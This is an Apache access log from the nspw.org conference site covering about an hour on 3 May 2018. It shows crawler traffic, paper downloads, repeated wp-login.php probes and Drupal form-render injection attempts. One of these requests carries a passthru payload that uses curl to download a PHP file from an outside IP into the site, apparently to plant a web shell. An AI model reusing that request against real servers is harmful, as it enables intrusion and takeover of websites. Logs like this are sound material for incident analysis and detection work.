177.42.196.112 - - [03/May/2018:12:14:42 -0400] "GET /wp-login.php HTTP/1.1" 404 7686 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
177.42.196.112 - - [03/May/2018:12:14:44 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.66.92 - - [03/May/2018:12:15:09 -0400] "GET /current/papers.shtml HTTP/1.1" 404 8014 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [03/May/2018:12:17:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
123.125.71.105 - - [03/May/2018:12:19:15 -0400] "GET / HTTP/1.1" 200 11573 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
79.117.206.209 - - [03/May/2018:12:20:22 -0400] "GET / HTTP/1.0" 400 0 "-" "-"
77.88.47.40 - - [03/May/2018:12:20:22 -0400] "GET /papers/1994/nspw1994-lin.pdf HTTP/1.1" 200 704179 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [03/May/2018:12:21:07 -0400] "GET /2012/papers HTTP/1.1" 200 7036 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [03/May/2018:12:21:37 -0400] "GET /2009/local.shtml HTTP/1.1" 200 6939 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [03/May/2018:12:22:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
125.167.126.152 - - [03/May/2018:12:22:47 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
125.167.126.152 - - [03/May/2018:12:22:50 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.66.92 - - [03/May/2018:12:23:14 -0400] "GET /papers/2001/nspw2001-blakley.pdf HTTP/1.1" 200 761570 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
197.43.7.151 - - [03/May/2018:12:25:26 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
197.43.7.151 - - [03/May/2018:12:25:28 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [03/May/2018:12:27:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
40.77.167.134 - - [03/May/2018:12:28:24 -0400] "GET /papers/2005/nspw2005-frontmatter.pdf HTTP/1.1" 200 1585361 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
112.202.162.90 - - [03/May/2018:12:28:54 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
31.178.250.247 - - [03/May/2018:12:29:18 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
31.178.250.247 - - [03/May/2018:12:29:18 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.76.15.147 - - [03/May/2018:12:30:57 -0400] "GET /2009/proceedings/2012/forms/contents.htm HTTP/1.1" 200 19816 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
62.198.75.235 - - [03/May/2018:12:32:39 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
62.198.75.235 - - [03/May/2018:12:32:40 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [03/May/2018:12:32:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
5.255.250.67 - - [03/May/2018:12:33:23 -0400] "GET /2003/oc.shtml HTTP/1.1" 200 5637 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
197.226.13.46 - - [03/May/2018:12:33:44 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
197.226.13.46 - - [03/May/2018:12:33:47 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
107.174.230.245 - - [03/May/2018:12:34:47 -0400] "GET / HTTP/1.1" 200 6646 "https://www.nspw.org" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
157.55.39.195 - - [03/May/2018:12:34:33 -0400] "GET /papers/2008/nspw2008-shirley.pdf HTTP/1.1" 200 559266 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
185.212.128.204 - - [03/May/2018:12:35:11 -0400] "GET /?q=user/password&name[%23post_render][0]=var_dump&name[%23type]=markup&name[%23markup]=abcdfg HTTP/1.1" 200 5814 "http://nspw.org/?q=user/password&name[%23post_render][0]=var_dump&name[%23type]=markup&name[%23markup]=abcdfg" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36"
185.212.128.204 - - [03/May/2018:12:35:14 -0400] "GET /?q=file/ajax/name/%23value/form-TToou0GZ33q3YiBrOTZfWdvOpf8yesKwJeQY6o30WSY HTTP/1.1" 200 4053 "http://nspw.org?q=file/ajax/name/%23value/form-TToou0GZ33q3YiBrOTZfWdvOpf8yesKwJeQY6o30WSY" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36"
66.249.66.91 - - [03/May/2018:12:35:38 -0400] "GET /robots.txt HTTP/1.1" 200 4504 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.66.93 - - [03/May/2018:12:35:38 -0400] "GET /2017 HTTP/1.1" 200 7049 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [03/May/2018:12:37:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
76.116.35.138 - - [03/May/2018:12:41:23 -0400] "GET /papers/2006/nspw2006-gutmann.pdf HTTP/1.1" 200 103455 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
76.116.35.138 - - [03/May/2018:12:41:23 -0400] "GET /favicon.ico HTTP/1.1" 404 4109 "https://www.nspw.org/papers/2006/nspw2006-gutmann.pdf" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
79.185.141.153 - - [03/May/2018:12:42:20 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
79.185.141.153 - - [03/May/2018:12:42:21 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [03/May/2018:12:42:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
38.99.62.93 - - [03/May/2018:12:43:59 -0400] "GET / HTTP/1.1" 200 6354 "http://www.nspw.org/" "Mozilla/5.0 (compatible; evc-batch/2.0)"
40.77.167.134 - - [03/May/2018:12:45:42 -0400] "GET /papers/2004/nspw2004-allwein.pdf HTTP/1.1" 200 275484 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
34.229.216.231 - - [03/May/2018:12:46:56 -0400] "GET /2018 HTTP/1.1" 200 6946 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0 (FlipboardProxy/1.2; +http://flipboard.com/browserproxy)"
61.6.238.86 - - [03/May/2018:12:47:19 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
61.6.238.86 - - [03/May/2018:12:47:19 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [03/May/2018:12:47:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.66.91 - - [03/May/2018:12:48:03 -0400] "GET /2018 HTTP/1.1" 200 6903 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [03/May/2018:12:49:34 -0400] "GET /proceedings/2013 HTTP/1.1" 200 7131 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
36.84.231.247 - - [03/May/2018:12:50:35 -0400] "HEAD / HTTP/1.1" 200 3626 "http://nspw.org" "Mozilla/5.0 (Linux; Android 7.0; LG-H918 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36"
36.84.231.247 - - [03/May/2018:12:50:37 -0400] "GET /?name%5B%23markup%5D=echo+-n+j52qvmxiag1pv2ca+%7C+md5sum+%26%26+curl+http%3A%2F%2F91.121.113.106%2F5tgkc17nk6hlu88y+-o+sites%2Fall%2F4432c2610e43b5822a92d211c288de7e.php&name%5B%23post_render%5D%5B%5D=passthru&name%5B%23type%5D=markup&q=user%2Fpassword HTTP/1.1" 200 2733 "http://nspw.org/?name%5B%23markup%5D=echo+-n+j52qvmxiag1pv2ca+%7C+md5sum+%26%26+curl+http%3A%2F%2F91.121.113.106%2F5tgkc17nk6hlu88y+-o+sites%2Fall%2F4432c2610e43b5822a92d211c288de7e.php&name%5B%23post_render%5D%5B%5D=passthru&name%5B%23type%5D=markup&q=user%2Fpassword" "Mozilla/5.0 (Linux; Android 7.0; LG-H918 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36"
36.84.231.247 - - [03/May/2018:12:50:39 -0400] "GET /?q=file%2Fajax%2Fname%2F%23value%2Fform-bjWnW8TUxpauiNtAY442MDlvIhA4dzBY3TR8knGp7jQ HTTP/1.1" 200 852 "http://nspw.org/?q=file%2Fajax%2Fname%2F%23value%2Fform-bjWnW8TUxpauiNtAY442MDlvIhA4dzBY3TR8knGp7jQ" "Mozilla/5.0 (Linux; Android 7.0; LG-H918 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36"
216.244.66.200 - - [03/May/2018:12:50:42 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
103.244.6.99 - - [03/May/2018:12:50:45 -0400] "HEAD / HTTP/1.1" 200 3626 "http://nspw.org" "Nokia7250/1.0 (3.14) Profile/MIDP-1.0 Configuration/CLDC-1.0"
66.249.66.93 - - [03/May/2018:12:51:11 -0400] "GET /papers/1998/nspw1998-slater.pdf HTTP/1.1" 200 863914 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [03/May/2018:12:52:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
157.55.39.195 - - [03/May/2018:12:54:00 -0400] "GET /papers/2006/nspw2006-ford.pdf HTTP/1.1" 200 229953 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
75.129.208.171 - - [03/May/2018:12:55:41 -0400] "GET /papers/2009/nspw2009-herley.pdf HTTP/1.1" 200 189209 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
75.129.208.171 - - [03/May/2018:12:55:41 -0400] "GET /favicon.ico HTTP/1.1" 404 4109 "https://www.nspw.org/papers/2009/nspw2009-herley.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
61.6.213.222 - - [03/May/2018:12:56:47 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
61.6.213.222 - - [03/May/2018:12:56:47 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [03/May/2018:12:57:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
83.84.64.87 - - [03/May/2018:12:58:31 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
83.84.64.87 - - [03/May/2018:12:58:31 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [03/May/2018:12:51:07 -0400] "GET /papers/2012/docs/p105.pdf HTTP/1.1" 200 3214628 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
35.226.23.240 - - [03/May/2018:12:58:40 -0400] "GET /robots.txt HTTP/1.1" 200 4480 "-" "ltx71 - (http://ltx71.com/)"
77.88.47.40 - - [03/May/2018:12:58:37 -0400] "GET /papers/1994/nspw1994-bell.pdf HTTP/1.1" 200 628859 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.66.93 - - [03/May/2018:13:00:28 -0400] "GET / HTTP/1.1" 200 6607 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
103.245.67.115 - - [03/May/2018:13:00:34 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [03/May/2018:12:53:37 -0400] "GET /papers/2012/docs/p105.pdf HTTP/1.1" 200 2995142 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
188.37.104.248 - - [03/May/2018:13:02:42 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
188.37.104.248 - - [03/May/2018:13:02:42 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [03/May/2018:13:02:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
197.148.25.212 - - [03/May/2018:13:03:13 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
197.148.25.212 - - [03/May/2018:13:03:14 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [03/May/2018:12:56:07 -0400] "GET /papers/2012/docs/p105.pdf HTTP/1.1" 200 3051062 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
180.76.15.154 - - [03/May/2018:13:04:17 -0400] "GET /papers/2000/?C=D;O=A HTTP/1.1" 200 7719 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
77.88.47.40 - - [03/May/2018:13:05:37 -0400] "GET /cfp/flyer_NSPW_2013.pdf HTTP/1.1" 200 95534 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
82.47.107.200 - - [03/May/2018:13:06:27 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
82.47.107.200 - - [03/May/2018:13:06:28 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [03/May/2018:13:06:38 -0400] "GET /2006/proceedings.shtml HTTP/1.1" 200 4804 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [03/May/2018:13:07:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
64.62.252.173 - - [03/May/2018:13:08:55 -0400] "GET /robots.txt HTTP/1.1" 200 4444 "-" "The Knowledge AI"
171.234.114.184 - - [03/May/2018:13:09:30 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
171.234.114.184 - - [03/May/2018:13:09:32 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
197.2.42.201 - - [03/May/2018:13:10:58 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
197.2.42.201 - - [03/May/2018:13:11:00 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
216.244.66.247 - - [03/May/2018:13:11:04 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.247 - - [03/May/2018:13:11:04 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
88.177.11.219 - - [03/May/2018:13:11:06 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
88.177.11.219 - - [03/May/2018:13:11:06 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [03/May/2018:13:12:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.66.92 - - [03/May/2018:13:12:53 -0400] "GET /2018/dates HTTP/1.1" 200 6270 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
41.66.235.70 - - [03/May/2018:13:15:33 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
41.66.235.70 - - [03/May/2018:13:15:33 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.102.6.199 - - [03/May/2018:13:16:17 -0400] "GET /2018 HTTP/1.1" 200 6904 "-" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.199 - - [03/May/2018:13:16:17 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 771 "https://www.nspw.org/2018" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.199 - - [03/May/2018:13:16:17 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 2534 "https://www.nspw.org/2018" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.197 - - [03/May/2018:13:16:17 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 4839 "https://www.nspw.org/2018" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.201 - - [03/May/2018:13:16:17 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 8764 "https://www.nspw.org/2018" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.201 - - [03/May/2018:13:16:17 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 4979 "https://www.nspw.org/2018" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.201 - - [03/May/2018:13:16:17 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 3866 "https://www.nspw.org/2018" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.199 - - [03/May/2018:13:16:17 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 4456 "https://www.nspw.org/2018" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.197 - - [03/May/2018:13:16:17 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 5701 "https://www.nspw.org/2018" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.199 - - [03/May/2018:13:16:17 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 3899 "https://www.nspw.org/2018" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.197 - - [03/May/2018:13:16:17 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 4140 "https://www.nspw.org/2018" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.201 - - [03/May/2018:13:16:17 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 3993 "https://www.nspw.org/2018" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.201 - - [03/May/2018:13:16:18 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 30995 "https://www.nspw.org/2018" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.197 - - [03/May/2018:13:16:19 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 10766 "https://www.nspw.org/2018" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.197 - - [03/May/2018:13:16:19 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1025 "https://www.nspw.org/2018" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.199 - - [03/May/2018:13:16:19 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 488 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.201 - - [03/May/2018:13:16:19 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 495 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.197 - - [03/May/2018:13:16:19 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 754 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.199 - - [03/May/2018:13:16:19 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 486 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.199 - - [03/May/2018:13:16:19 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 200 993 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
